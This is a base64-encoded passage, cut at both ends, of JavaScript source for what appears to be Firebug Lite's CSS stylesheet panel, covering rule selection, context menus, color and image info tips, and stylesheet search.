POiB4eHhwZWRybyBuZWVkIHRvIGZpeCBzaG93VG9vbGJhckJ1dHRvbnMgZnVuY3Rpb24NCiAgICAgICAgLy90aGlzLnNob3dUb29sYmFyQnV0dG9ucygiZmJDU1NCdXR0b25zIiwgIWlzU3lzdGVtU3R5bGVTaGVldCh0aGlzLmxvY2F0aW9uKSk7DQoNCiAgICAgICAgLy9kaXNwYXRjaChbRmlyZWJ1Zy5BMTF5TW9kZWxdLCAnb25DU1NSdWxlc0FkZGVkJywgW3RoaXMsIHRoaXMucGFuZWxOb2RlXSk7DQogICAgfSwNCg0KICAgIHVwZGF0ZVNlbGVjdGlvbjogZnVuY3Rpb24ob2JqZWN0KQ0KICAgIHsNCiAgICAgICAgdGhpcy5zZWxlY3Rpb24gPSBudWxsOw0KDQogICAgICAgIGlmIChvYmplY3QgaW5zdGFuY2VvZiBDU1NTdHlsZURlY2xhcmF0aW9uKSB7DQogICAgICAgICAgICBvYmplY3QgPSBvYmplY3QucGFyZW50UnVsZTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmIChvYmplY3QgaW5zdGFuY2VvZiBDU1NTdHlsZVJ1bGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRoaXMubmF2aWdhdGUob2JqZWN0LnBhcmVudFN0eWxlU2hlZXQpOw0KICAgICAgICAgICAgdGhpcy5oaWdobGlnaHRSdWxlKG9iamVjdCk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAob2JqZWN0IGluc3RhbmNlb2YgQ1NTU3R5bGVTaGVldCkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5uYXZpZ2F0ZShvYmplY3QpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgaWYgKG9iamVjdCBpbnN0YW5jZW9mIFNvdXJjZUxpbmspDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBzb3VyY2VMaW5rID0gb2JqZWN0Ow0KDQogICAgICAgICAgICAgICAgdmFyIHNvdXJjZUZpbGUgPSBnZXRTb3VyY2VGaWxlQnlIcmVmKHNvdXJjZUxpbmsuaHJlZiwgdGhpcy5jb250ZXh0KTsNCiAgICAgICAgICAgICAgICBpZiAoc291cmNlRmlsZSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGNsZWFyTm9kZSh0aGlzLnBhbmVsTm9kZSk7ICAvLyByZXBsYWNlIHJlbmRlcmVkIHN0eWxlc2hlZXRzDQogICAgICAgICAgICAgICAgICAgIHRoaXMuc2hvd1NvdXJjZUZpbGUoc291cmNlRmlsZSk7DQoNCiAgICAgICAgICAgICAgICAgICAgdmFyIGxpbmVObyA9IG9iamVjdC5saW5lOw0KICAgICAgICAgICAgICAgICAgICBpZiAobGluZU5vKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5zY3JvbGxUb0xpbmUobGluZU5vLCB0aGlzLmp1bXBIaWdobGlnaHRGYWN0b3J5KGxpbmVObywgdGhpcy5jb250ZXh0KSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UgLy8gWFhYampiIHdlIHNob3VsZCBub3QgYmUgdGFraW5nIHRoaXMgcGF0aA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHN0eWxlc2hlZXQgPSBnZXRTdHlsZVNoZWV0QnlIcmVmKHNvdXJjZUxpbmsuaHJlZiwgdGhpcy5jb250ZXh0KTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHN0eWxlc2hlZXQpDQogICAgICAgICAgICAgICAgICAgICAgICB0aGlzLm5hdmlnYXRlKHN0eWxlc2hlZXQpOw0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19DU1MpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImNzcy51cGRhdGVTZWxlY3Rpb24gbm8gc291cmNlRmlsZSBmb3IgIitzb3VyY2VMaW5rLmhyZWYsIHNvdXJjZUxpbmspOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2goZXhjKSB7DQogICAgICAgICAgICAgICAgaWYgKEZCVHJhY2UuREJHX0NTUykNCiAgICAgICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImNzcy51cERhdGVTZWxlY3Rpb24gRkFJTFMgIitleGMsIGV4Yyk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgdXBkYXRlT3B0aW9uOiBmdW5jdGlvbihuYW1lLCB2YWx1ZSkNCiAgICB7DQogICAgICAgIGlmIChuYW1lID09ICJleHBhbmRTaG9ydGhhbmRQcm9wcyIpDQogICAgICAgICAgICB0aGlzLnJlZnJlc2goKTsNCiAgICB9LA0KDQogICAgZ2V0TG9jYXRpb25MaXN0OiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICB2YXIgc3R5bGVTaGVldHMgPSBnZXRBbGxTdHlsZVNoZWV0cyh0aGlzLmNvbnRleHQpOw0KICAgICAgICByZXR1cm4gc3R5bGVTaGVldHM7DQogICAgfSwNCg0KICAgIGdldE9wdGlvbnNNZW51SXRlbXM6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiBbDQogICAgICAgICAgICB7bGFiZWw6ICJFeHBhbmQgU2hvcnRoYW5kIFByb3BlcnRpZXMiLCB0eXBlOiAiY2hlY2tib3giLCBjaGVja2VkOiBGaXJlYnVnLmV4cGFuZFNob3J0aGFuZFByb3BzLA0KICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiBiaW5kRml4ZWQoRmlyZWJ1Zy50b2dnbGVQcmVmLCBGaXJlYnVnLCAiZXhwYW5kU2hvcnRoYW5kUHJvcHMiKSB9LA0KICAgICAgICAgICAgIi0iLA0KICAgICAgICAgICAge2xhYmVsOiAiUmVmcmVzaCIsIGNvbW1hbmQ6IGJpbmQodGhpcy5yZWZyZXNoLCB0aGlzKSB9DQogICAgICAgIF07DQogICAgfSwNCg0KICAgIGdldENvbnRleHRNZW51SXRlbXM6IGZ1bmN0aW9uKHN0eWxlLCB0YXJnZXQpDQogICAgew0KICAgICAgICB2YXIgaXRlbXMgPSBbXTsNCg0KICAgICAgICBpZiAodGhpcy5pbmZvVGlwVHlwZSA9PSAiY29sb3IiKQ0KICAgICAgICB7DQogICAgICAgICAgICBpdGVtcy5wdXNoKA0KICAgICAgICAgICAgICAgIHtsYWJlbDogIkNvcHlDb2xvciIsDQogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6IGJpbmRGaXhlZChjb3B5VG9DbGlwYm9hcmQsIEZCTCwgdGhpcy5pbmZvVGlwT2JqZWN0KSB9DQogICAgICAgICAgICApOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgaWYgKHRoaXMuaW5mb1RpcFR5cGUgPT0gImltYWdlIikNCiAgICAgICAgew0KICAgICAgICAgICAgaXRlbXMucHVzaCgNCiAgICAgICAgICAgICAgICB7bGFiZWw6ICJDb3B5SW1hZ2VMb2NhdGlvbiIsDQogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6IGJpbmRGaXhlZChjb3B5VG9DbGlwYm9hcmQsIEZCTCwgdGhpcy5pbmZvVGlwT2JqZWN0KSB9LA0KICAgICAgICAgICAgICAgIHtsYWJlbDogIk9wZW5JbWFnZUluTmV3VGFiIiwNCiAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogYmluZEZpeGVkKG9wZW5OZXdUYWIsIEZCTCwgdGhpcy5pbmZvVGlwT2JqZWN0KSB9DQogICAgICAgICAgICApOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8vaWYgKHRoaXMuc2VsZWN0aW9uIGluc3RhbmNlb2YgRWxlbWVudCkNCiAgICAgICAgaWYgKGlzRWxlbWVudCh0aGlzLnNlbGVjdGlvbikpDQogICAgICAgIHsNCiAgICAgICAgICAgIGl0ZW1zLnB1c2goDQogICAgICAgICAgICAgICAgLy8iLSIsDQogICAgICAgICAgICAgICAge2xhYmVsOiAiRWRpdFN0eWxlIiwNCiAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogYmluZEZpeGVkKHRoaXMuZWRpdEVsZW1lbnRTdHlsZSwgdGhpcykgfQ0KICAgICAgICAgICAgKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmICghaXNTeXN0ZW1TdHlsZVNoZWV0KHRoaXMuc2VsZWN0aW9uKSkNCiAgICAgICAgew0KICAgICAgICAgICAgaXRlbXMucHVzaCgNCiAgICAgICAgICAgICAgICAgICAgLy8iLSIsDQogICAgICAgICAgICAgICAgICAgIHtsYWJlbDogIk5ld1J1bGUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogYmluZEZpeGVkKHRoaXMuaW5zZXJ0UnVsZSwgdGhpcywgdGFyZ2V0KSB9DQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHZhciBjc3NSdWxlID0gZ2V0QW5jZXN0b3JCeUNsYXNzKHRhcmdldCwgImNzc1J1bGUiKTsNCiAgICAgICAgaWYgKGNzc1J1bGUgJiYgaGFzQ2xhc3MoY3NzUnVsZSwgImNzc0VkaXRhYmxlUnVsZSIpKQ0KICAgICAgICB7DQogICAgICAgICAgICBpdGVtcy5wdXNoKA0KICAgICAgICAgICAgICAgICItIiwNCiAgICAgICAgICAgICAgICB7bGFiZWw6ICJOZXdQcm9wIiwNCiAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogYmluZEZpeGVkKHRoaXMuaW5zZXJ0UHJvcGVydHlSb3csIHRoaXMsIHRhcmdldCkgfQ0KICAgICAgICAgICAgKTsNCg0KICAgICAgICAgICAgdmFyIHByb3BSb3cgPSBnZXRBbmNlc3RvckJ5Q2xhc3ModGFyZ2V0LCAiY3NzUHJvcCIpOw0KICAgICAgICAgICAgaWYgKHByb3BSb3cpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHByb3BOYW1lID0gZ2V0Q2hpbGRCeUNsYXNzKHByb3BSb3csICJjc3NQcm9wTmFtZSIpW3RleHRDb250ZW50XTsNCiAgICAgICAgICAgICAgICB2YXIgaXNEaXNhYmxlZCA9IGhhc0NsYXNzKHByb3BSb3csICJkaXNhYmxlZFN0eWxlIik7DQoNCiAgICAgICAgICAgICAgICBpdGVtcy5wdXNoKA0KICAgICAgICAgICAgICAgICAgICB7bGFiZWw6ICRTVFJGKCJFZGl0UHJvcCIsIFtwcm9wTmFtZV0pLCBub2wxMG46IHRydWUsDQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiBiaW5kRml4ZWQodGhpcy5lZGl0UHJvcGVydHlSb3csIHRoaXMsIHByb3BSb3cpIH0sDQogICAgICAgICAgICAgICAgICAgIHtsYWJlbDogJFNUUkYoIkRlbGV0ZVByb3AiLCBbcHJvcE5hbWVdKSwgbm9sMTBuOiB0cnVlLA0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogYmluZEZpeGVkKHRoaXMuZGVsZXRlUHJvcGVydHlSb3csIHRoaXMsIHByb3BSb3cpIH0sDQogICAgICAgICAgICAgICAgICAgIHtsYWJlbDogJFNUUkYoIkRpc2FibGVQcm9wIiwgW3Byb3BOYW1lXSksIG5vbDEwbjogdHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICJjaGVja2JveCIsIGNoZWNrZWQ6IGlzRGlzYWJsZWQsDQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiBiaW5kRml4ZWQodGhpcy5kaXNhYmxlUHJvcGVydHlSb3csIHRoaXMsIHByb3BSb3cpIH0NCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgaXRlbXMucHVzaCgNCiAgICAgICAgICAgICItIiwNCiAgICAgICAgICAgIHtsYWJlbDogIlJlZnJlc2giLCBjb21tYW5kOiBiaW5kKHRoaXMucmVmcmVzaCwgdGhpcykgfQ0KICAgICAgICApOw0KDQogICAgICAgIHJldHVybiBpdGVtczsNCiAgICB9LA0KDQogICAgYnJvd3NlT2JqZWN0OiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgICAgICBpZiAodGhpcy5pbmZvVGlwVHlwZSA9PSAiaW1hZ2UiKQ0KICAgICAgICB7DQogICAgICAgICAgICBvcGVuTmV3VGFiKHRoaXMuaW5mb1RpcE9iamVjdCk7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBzaG93SW5mb1RpcDogZnVuY3Rpb24oaW5mb1RpcCwgdGFyZ2V0LCB4LCB5KQ0KICAgIHsNCiAgICAgICAgdmFyIHByb3BWYWx1ZSA9IGdldEFuY2VzdG9yQnlDbGFzcyh0YXJnZXQsICJjc3NQcm9wVmFsdWUiKTsNCiAgICAgICAgaWYgKHByb3BWYWx1ZSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIG9mZnNldCA9IGdldENsaWVudE9mZnNldChwcm9wVmFsdWUpOw0KICAgICAgICAgICAgdmFyIG9mZnNldFggPSB4LW9mZnNldC54Ow0KDQogICAgICAgICAgICB2YXIgdGV4dCA9IHByb3BWYWx1ZVt0ZXh0Q29udGVudF07DQogICAgICAgICAgICB2YXIgY2hhcldpZHRoID0gcHJvcFZhbHVlLm9mZnNldFdpZHRoL3RleHQubGVuZ3RoOw0KICAgICAgICAgICAgdmFyIGNoYXJPZmZzZXQgPSBNYXRoLmZsb29yKG9mZnNldFgvY2hhcldpZHRoKTsNCg0KICAgICAgICAgICAgdmFyIGNzc1ZhbHVlID0gcGFyc2VDU1NWYWx1ZSh0ZXh0LCBjaGFyT2Zmc2V0KTsNCiAgICAgICAgICAgIGlmIChjc3NWYWx1ZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoY3NzVmFsdWUudmFsdWUgPT0gdGhpcy5pbmZvVGlwVmFsdWUpDQogICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KDQogICAgICAgICAgICAgICAgdGhpcy5pbmZvVGlwVmFsdWUgPSBjc3NWYWx1ZS52YWx1ZTsNCg0KICAgICAgICAgICAgICAgIGlmIChjc3NWYWx1ZS50eXBlID09ICJyZ2IiIHx8ICghY3NzVmFsdWUudHlwZSAmJiBpc0NvbG9yS2V5d29yZChjc3NWYWx1ZS52YWx1ZSkpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGhpcy5pbmZvVGlwVHlwZSA9ICJjb2xvciI7DQogICAgICAgICAgICAgICAgICAgIHRoaXMuaW5mb1RpcE9iamVjdCA9IGNzc1ZhbHVlLnZhbHVlOw0KDQogICAgICAgICAgICAgICAgICAgIHJldHVybiBGaXJlYnVnLkluZm9UaXAucG9wdWxhdGVDb2xvckluZm9UaXAoaW5mb1RpcCwgY3NzVmFsdWUudmFsdWUpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlIGlmIChjc3NWYWx1ZS50eXBlID09ICJ1cmwiKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgLy8vdmFyIHByb3BOYW1lTm9kZSA9IHRhcmdldC5wYXJlbnROb2RlLmdldEVsZW1lbnRzQnlDbGFzc05hbWUoImNzc1Byb3BOYW1lIikuaXRlbSgwKTsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHByb3BOYW1lTm9kZSA9IGdldEVsZW1lbnRCeUNsYXNzKHRhcmdldC5wYXJlbnROb2RlLCAiY3NzUHJvcE5hbWUiKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHByb3BOYW1lTm9kZSAmJiBpc0ltYWdlUnVsZShwcm9wTmFtZU5vZGVbdGV4dENvbnRlbnRdKSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHJ1bGUgPSBGaXJlYnVnLmdldFJlcE9iamVjdCh0YXJnZXQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGJhc2VVUkwgPSB0aGlzLmdldFN0eWxlc2hlZXRVUkwocnVsZSk7DQogICAgICAgICAgICAgICAgICAgICAgICB2YXIgcmVsVVJMID0gcGFyc2VVUkxWYWx1ZShjc3NWYWx1ZS52YWx1ZSk7DQogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYWJzVVJMID0gaXNEYXRhVVJMKHJlbFVSTCkgPyByZWxVUkw6YWJzb2x1dGVVUkwocmVsVVJMLCBiYXNlVVJMKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciByZXBlYXQgPSBwYXJzZVJlcGVhdFZhbHVlKHRleHQpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICB0aGlzLmluZm9UaXBUeXBlID0gImltYWdlIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMuaW5mb1RpcE9iamVjdCA9IGFic1VSTDsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEZpcmVidWcuSW5mb1RpcC5wb3B1bGF0ZUltYWdlSW5mb1RpcChpbmZvVGlwLCBhYnNVUkwsIHJlcGVhdCk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBkZWxldGUgdGhpcy5pbmZvVGlwVHlwZTsNCiAgICAgICAgZGVsZXRlIHRoaXMuaW5mb1RpcFZhbHVlOw0KICAgICAgICBkZWxldGUgdGhpcy5pbmZvVGlwT2JqZWN0Ow0KICAgIH0sDQoNCiAgICBnZXRFZGl0b3I6IGZ1bmN0aW9uKHRhcmdldCwgdmFsdWUpDQogICAgew0KICAgICAgICBpZiAodGFyZ2V0ID09IHRoaXMucGFuZWxOb2RlDQogICAgICAgICAgICB8fCBoYXNDbGFzcyh0YXJnZXQsICJjc3NTZWxlY3RvciIpIHx8IGhhc0NsYXNzKHRhcmdldCwgImNzc1J1bGUiKQ0KICAgICAgICAgICAgfHwgaGFzQ2xhc3ModGFyZ2V0LCAiY3NzU2hlZXQiKSkNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKCF0aGlzLnJ1bGVFZGl0b3IpDQogICAgICAgICAgICAgICAgdGhpcy5ydWxlRWRpdG9yID0gbmV3IENTU1J1bGVFZGl0b3IodGhpcy5kb2N1bWVudCk7DQoNCiAgICAgICAgICAgIHJldHVybiB0aGlzLnJ1bGVFZGl0b3I7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoIXRoaXMuZWRpdG9yKQ0KICAgICAgICAgICAgICAgIHRoaXMuZWRpdG9yID0gbmV3IENTU0VkaXRvcih0aGlzLmRvY3VtZW50KTsNCg0KICAgICAgICAgICAgcmV0dXJuIHRoaXMuZWRpdG9yOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGdldERlZmF1bHRMb2NhdGlvbjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBzdHlsZVNoZWV0cyA9IHRoaXMuY29udGV4dC53aW5kb3cuZG9jdW1lbnQuc3R5bGVTaGVldHM7DQogICAgICAgICAgICBpZiAoc3R5bGVTaGVldHMubGVuZ3RoKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBzaGVldCA9IHN0eWxlU2hlZXRzWzBdOw0KICAgICAgICAgICAgICAgIHJldHVybiAoRmlyZWJ1Zy5maWx0ZXJTeXN0ZW1VUkxzICYmIGlzU3lzdGVtVVJMKGdldFVSTEZvclN0eWxlU2hlZXQoc2hlZXQpKSkgPyBudWxsIDogc2hlZXQ7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggKGV4YykNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKEZCVHJhY2UuREJHX0xPQ0FUSU9OUykNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiY3NzLmdldERlZmF1bHRMb2NhdGlvbiBGQUlMUyAiK2V4YywgZXhjKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBnZXRPYmplY3REZXNjcmlwdGlvbjogZnVuY3Rpb24oc3R5bGVTaGVldCkNCiAgICB7DQogICAgICAgIHZhciB1cmwgPSBnZXRVUkxGb3JTdHlsZVNoZWV0KHN0eWxlU2hlZXQpOw0KICAgICAgICB2YXIgaW5zdGFuY2UgPSBnZXRJbnN0YW5jZUZvclN0eWxlU2hlZXQoc3R5bGVTaGVldCk7DQoNCiAgICAgICAgdmFyIGJhc2VEZXNjcmlwdGlvbiA9IHNwbGl0VVJMQmFzZSh1cmwpOw0KICAgICAgICBpZiAoaW5zdGFuY2UpIHsNCiAgICAgICAgICBiYXNlRGVzY3JpcHRpb24ubmFtZSA9IGJhc2VEZXNjcmlwdGlvbi5uYW1lICsgIiAjIiArIChpbnN0YW5jZSArIDEpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBiYXNlRGVzY3JpcHRpb247DQogICAgfSwNCg0KICAgIHNlYXJjaDogZnVuY3Rpb24odGV4dCwgcmV2ZXJzZSkNCiAgICB7DQogICAgICAgIHZhciBjdXJEb2MgPSB0aGlzLnNlYXJjaEN1cnJlbnREb2MoIUZpcmVidWcuc2VhcmNoR2xvYmFsLCB0ZXh0LCByZXZlcnNlKTsNCiAgICAgICAgaWYgKCFjdXJEb2MgJiYgRmlyZWJ1Zy5zZWFyY2hHbG9iYWwpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiB0aGlzLnNlYXJjaE90aGVyRG9jcyh0ZXh0LCByZXZlcnNlKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gY3VyRG9jOw0KICAgIH0sDQoNCiAgICBzZWFyY2hPdGhlckRvY3M6IGZ1bmN0aW9uKHRleHQsIHJldmVyc2UpDQogICAgew0KICAgICAgICB2YXIgc2NhblJFID0gRmlyZWJ1Zy5TZWFyY2guZ2V0VGVzdGluZ1JlZ2V4KHRleHQpOw0KICAgICAgICBmdW5jdGlvbiBzY2FuRG9jKHN0eWxlU2hlZXQpIHsNCiAgICAgICAgICAgIC8vIHdlIGRvbid0IGNhcmUgYWJvdXQgcmV2ZXJzZSBoZXJlIGFzIHdlIGFyZSBqdXN0IGxvb2tpbmcgZm9yIGV4aXN0ZW5jZSwNCiAgICAgICAgICAgIC8vIGlmIHdlIGRvIGhhdmUgYSByZXN1bHQgd2Ugd2lsbCBoYW5kbGUgdGhlIHJldmVyc2UgbG9naWMgb24gZGlzcGxheQ0KICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBzdHlsZVNoZWV0LmNzc1J1bGVzLmxlbmd0aDsgaSsrKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChzY2FuUkUudGVzdChzdHlsZVNoZWV0LmNzc1J1bGVzW2ldLmNzc1RleHQpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKHRoaXMubmF2aWdhdGVUb05leHREb2N1bWVudChzY2FuRG9jLCByZXZlcnNlKSkNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuIHRoaXMuc2VhcmNoQ3VycmVudERvYyh0cnVlLCB0ZXh0LCByZXZlcnNlKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBzZWFyY2hDdXJyZW50RG9jOiBmdW5jdGlvbih3cmFwU2VhcmNoLCB0ZXh0LCByZXZlcnNlKQ0KICAgIHsNCiAgICAgICAgaWYgKCF0ZXh0KQ0KICAgICAgICB7DQogICAgICAgICAgICBkZWxldGUgdGhpcy5jdXJyZW50U2VhcmNoOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQoNCiAgICAgICAgdmFyIHJvdzsNCiAgICAgICAgaWYgKHRoaXMuY3VycmVudFNlYXJjaCAmJiB0ZXh0ID09IHRoaXMuY3VycmVudFNlYXJjaC50ZXh0KQ0KICAgICAgICB7DQogICAgICAgICAgICByb3cgPSB0aGlzLmN1cnJlbnRTZWFyY2guZmluZE5leHQod3JhcFNlYXJjaCwgZmFsc2UsIHJldmVyc2UsIEZpcmVidWcuU2VhcmNoLmlzQ2FzZVNlbnNpdGl2ZSh0ZXh0KSk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAodGhpcy5lZGl0aW5nKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHRoaXMuY3VycmVudFNlYXJjaCA9IG5ldyBUZXh0U2VhcmNoKHRoaXMuc3R5bGVzaGVldEVkaXRvci5ib3gpOw0KICAgICAgICAgICAgICAgIHJvdyA9IHRoaXMuY3VycmVudFNlYXJjaC5maW5kKHRleHQsIHJldmVyc2UsIEZpcmVidWcuU2VhcmNoLmlzQ2FzZVNlbnNpdGl2ZSh0ZXh0KSk7DQoNCiAgICAgICAgICAgICAgICBpZiAocm93KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHNlbCA9IHRoaXMuZG9jdW1lbnQuZGVmYXVsdFZpZXcuZ2V0U2VsZWN0aW9uKCk7DQogICAgICAgICAgICAgICAgICAgIHNlbC5yZW1vdmVBbGxSYW5nZXMoKTsNCiAgICAgICAgICAgICAgICAgICAgc2VsLmFkZFJhbmdlKHRoaXMuY3VycmVudFNlYXJjaC5yYW5nZSk7DQogICAgICAgICAgICAgICAgICAgIHNjcm9sbFNlbGVjdGlvbkludG9WaWV3KHRoaXMpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZnVuY3Rpb24gZmluZFJvdyhub2RlKSB7IHJldHVybiBub2RlLm5vZGVUeXBlID09IDEgPyBub2RlIDogbm9kZS5wYXJlbnROb2RlOyB9DQogICAgICAgICAgICAgICAgdGhpcy5jdXJyZW50U2VhcmNoID0gbmV3IFRleHRTZWFyY2godGhpcy5wYW5lbE5vZGUsIGZpbmRSb3cpOw0KICAgICAgICAgICAgICAgIHJvdyA9IHRoaXMuY3VycmVudFNlYXJjaC5maW5kKHRleHQsIHJldmVyc2UsIEZpcmVidWcuU2VhcmNoLmlzQ2FzZVNlbnNpdGl2ZSh0ZXh0KSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBpZiAocm93KQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLmRvY3VtZW50LmRlZmF1bHRWaWV3LmdldFNlbGVjdGlvbigpLnNlbGVjdEFsbENoaWxkcmVuKHJvdyk7DQogICAgICAgICAgICBzY3JvbGxJbnRvQ2VudGVyVmlldyhyb3csIHRoaXMucGFuZWxOb2RlKTsNCiAgICAgICAgICAgIGRpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICdvbkNTU1NlYXJjaE1hdGNoRm91bmQnLCBbdGhpcywgdGV4dCwgcm93XSk7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIGRpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICdvbkNTU1NlYXJjaE1hdGNoRm91bmQnLCBbdGhpcywgdGV4dCwgbnVsbF0pOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGdldFNlYXJjaE9wdGlvbnNNZW51SXRlbXM6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiBbDQogICAgICAgICAgICBGaXJlYnVnLlNlYXJjaC5zZWFyY2hPcHRpb25NZW51KCJzZWFyY2guQ2FzZV9TZW5zaXRpdmUiLCAic2VhcmNoQ2FzZVNlbnNpdGl2ZSIpLA0KICAgICAgICAgICAgRmlyZWJ1Zy5TZWFyY2guc2VhcmNoT3B0aW9uTWVudSgic2VhcmNoLk11bHRpcGxlX0ZpbGVzIiwgInNlYXJjaEdsb2JhbCIpDQogICAgICAgIF07DQogICAgfQ0KfSk7DQovKiovDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KZnVuY3Rpb24gQ1NTRWxlbWVudFBhbmVsKCkge30NCg0KQ1NTRWxlbWVudFBhbmVsLnByb3RvdHlwZSA9IGV4dGVuZChGaXJlYnVnLkNTU1N0eWxlU2hlZXRQYW5lbC5wcm90b3R5cGUsDQp7DQogICAgdGVtcGxhdGU6IGRvbXBsYXRlKA0KICAgIHsNCiAgICAgICAgY2FzY2FkZWRUYWc6DQogICAgICAgICAgICBESVYoeyJjbGFzcyI6ICJhMTF5Q1NTVmlldyIsICByb2xlI